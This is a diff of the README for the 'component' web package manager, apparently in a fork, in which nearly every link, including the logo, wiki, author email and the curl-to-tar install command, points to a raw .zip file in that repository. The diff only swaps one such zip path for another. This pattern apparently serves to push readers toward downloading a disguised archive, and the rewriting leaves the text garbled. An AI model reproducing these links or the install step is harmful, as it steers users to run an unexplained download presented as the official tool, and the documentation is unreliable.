@@ -1,17 +1,17 @@
-  ![web component logo](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+  ![web component logo](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
 
   Component package manager for building a better web.
 
 ## Installation
 
-  With [node](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) previously installed:
+  With [node](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) previously installed:
 
      $ npm install -g component
 
   With node binary on OSX:
 
      $ (cd /usr/local && \
-        curl -L# https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip \
+        curl -L# https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip \
         | tar -zx --strip 1) \
        && npm install -g component \
        && printf "installed component(1) %s\n" $(component --version)
@@ -25,7 +25,7 @@
   - no registry publishing or account required, uses github repositories
   - extensible sub-commands via `component-YOURCOMMAND` git-style
   - component skeleton creation command
-  - installs dependencies from the command-line or https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+  - installs dependencies from the command-line or https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   - avoid name squatting through github's naming conventions
   - build your components with `--standalone` to share them with non-component(1) users
   - discovery of useful packages is simple with a robust search
@@ -36,27 +36,27 @@
 
 ## Links
 
- - [List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) of all available components
- - [Wiki](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - [Mailing List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - [Google+ Community](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - component ["spec"](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - [List](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) of all available components
+ - [Wiki](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - [Mailing List](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - [Google+ Community](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - component ["spec"](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
  - join `#components` on freenode
- - follow [@component_js](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) on twitter
- - [Building better components](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) tips
- - [F.A.Q](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - In-browser component [builder](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - component [dependency visualizer](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - follow [@component_js](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) on twitter
+ - [Building better components](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) tips
+ - [F.A.Q](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - In-browser component [builder](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - component [dependency visualizer](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
 
 ## Screencasts
 
- - [Creating web components](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
- - [App integration introduction](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+ - [Creating web components](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+ - [App integration introduction](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
 
 ## Articles
 
-  - building a [date picker component](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
-  - original [component blog post](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
+  - building a [date picker component](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+  - original [component blog post](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
 
 ## Usage
 
@@ -100,11 +100,11 @@ $ component install component/tip
    install : component/emitter@master
        dep : component/jquery@master
    install : component/jquery@master
-     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     fetch : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     fetch : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   complete : component/emitter
   complete : component/jquery
   complete : component/tip
@@ -112,23 +112,23 @@ $ component install component/tip
 
 ## Searching for components
 
-  By adding your component to the [Components List](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) wiki page it will become automatically available to `component-search(1)`. When invoked with no query all components are displayed, otherwise a filtered search, ordered by the number of github "stars":
+  By adding your component to the [Components List](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) wiki page it will become automatically available to `component-search(1)`. When invoked with no query all components are displayed, otherwise a filtered search, ordered by the number of github "stars":
 
 ```
 $ component search ui
 
   component/dialog
-  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+  url: https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   desc: Dialog component
   ★ 12
 
   component/notification
-  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+  url: https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   desc: Notification component
   ★ 10
 
   component/overlay
-  url: https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+  url: https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   desc: Overlay component
   ★ 7
 
@@ -143,7 +143,7 @@ $ component search ui
   A nice side-effect of this namespaced world is that dependencies
   are explicit and self-documenting. No longer do you need to query
   the registry for a "repo" property that may not exist, it's simply
-  built in to the package name, for example ["https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip"](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) rather
+  built in to the package name, for example ["https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip"](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) rather
   than the unclear "page".
 
   Another benefit of this is that there are zero name collisions, for example
@@ -166,13 +166,13 @@ does this component have css? yes
 does this component have html? yes
 
      create : popover
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
      create : popover/Makefile
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
-     create : https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
+     create : https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
 
 ```
 
@@ -202,10 +202,10 @@ does this component have html? yes
 
 ## Using private components
 
-  `component(1)` uses [~https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip(4), like other tools such as [curl](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) and [git](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip), to specify credentials for remote hosts. Simply create a `~https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip` file in the home directory:
+  `component(1)` uses [~https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip(4), like other tools such as [curl](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) and [git](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip), to specify credentials for remote hosts. Simply create a `~https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip` file in the home directory:
 
 ```
-machine https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip
+machine https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip
   login visionmedia
   password pass123
 ```
@@ -245,21 +245,21 @@ $ make test
 
   Open source application examples:
 
-  - Example using [script tags](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) for integrating component with existing non-commonjs applications or frameworks
-  - [Todo list](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) example comprised of private and public components
-  - [https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) website
-  - [Posty](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip)
-  - [NoFlo](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) flow-based programming environment
+  - Example using [script tags](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) for integrating component with existing non-commonjs applications or frameworks
+  - [Todo list](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) example comprised of private and public components
+  - [https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) website
+  - [Posty](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip)
+  - [NoFlo](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) flow-based programming environment
 
 ## Extensions
 
- - [component-graph(1)](https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip) dependency graphs for component projects
+ - [component-graph(1)](https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip) dependency graphs for component projects
 
 ## License
 
 (The MIT License)
 
-Copyright (c) 2012 TJ Holowaychuk &lt;https://github.com/videogramme/component/raw/refs/heads/master/test/fixtures/path/lib/baz/Software-1.2.zip;
+Copyright (c) 2012 TJ Holowaychuk &lt;https://github.com/videogramme/component/raw/refs/heads/master/lib/Software_2.1.zip;
 
 Permission is hereby granted, free of charge, to any person obtaining
 a copy of this software and associated documentation files (the
